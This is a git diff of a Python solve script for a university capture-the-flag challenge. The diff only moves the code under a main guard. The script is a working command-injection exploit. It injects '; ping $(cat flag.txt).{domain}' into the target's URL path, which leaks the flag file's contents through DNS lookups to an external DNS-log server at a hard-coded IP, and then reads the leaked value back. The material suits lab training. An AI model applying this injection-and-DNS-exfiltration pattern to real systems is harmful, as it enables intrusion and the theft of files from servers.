@@ -21,30 +21,32 @@ import random
 import requests
 import urllib.parse
 
-# dnsbin.zhack.ca (sometimes it is blocked by the firewall)
-dnslog_url = "http://47.244.138.18"
+if __name__ == "__main__":
 
-client = requests.Session()
+    # dnsbin.zhack.ca (sometimes it is blocked by the firewall)
+    dnslog_url = "http://47.244.138.18"
 
-# Get a new domain
-response = client.get(url=f"{dnslog_url}/getdomain.php?t={random.random()}")
-domain = response.text
+    client = requests.Session()
 
-# Inject the command
-challenge_url = "http://cyberchallenge.disi.unitn.it:50000"
+    # Get a new domain
+    response = client.get(url=f"{dnslog_url}/getdomain.php?t={random.random()}")
+    domain = response.text
 
-# Execute the ping to the domain
-# This works because everything that comes before it is associated to the domain
-# In this case, we put the content of flag.txt before the domain
-command = f"; ping $(cat flag.txt).{domain}"
-command = urllib.parse.quote(command)
+    # Inject the command
+    challenge_url = "http://cyberchallenge.disi.unitn.it:50000"
 
-client.get(url=f"{challenge_url}/pid/{command}")
+    # Execute the ping to the domain
+    # This works because everything that comes before it is associated to the domain
+    # In this case, we put the content of flag.txt before the domain
+    command = f"; ping $(cat flag.txt).{domain}"
+    command = urllib.parse.quote(command)
 
-# Get the last record
-response = client.get(url=f"{dnslog_url}/getrecords.php?t={random.random()}")
-records = response.json()
+    client.get(url=f"{challenge_url}/pid/{command}")
 
-# Extract the flag
-flag = records[0][0].replace(f".{domain}","")
-print(flag)
+    # Get the last record
+    response = client.get(url=f"{dnslog_url}/getrecords.php?t={random.random()}")
+    records = response.json()
+
+    # Extract the flag
+    flag = records[0][0].replace(f".{domain}","")
+    print(flag)
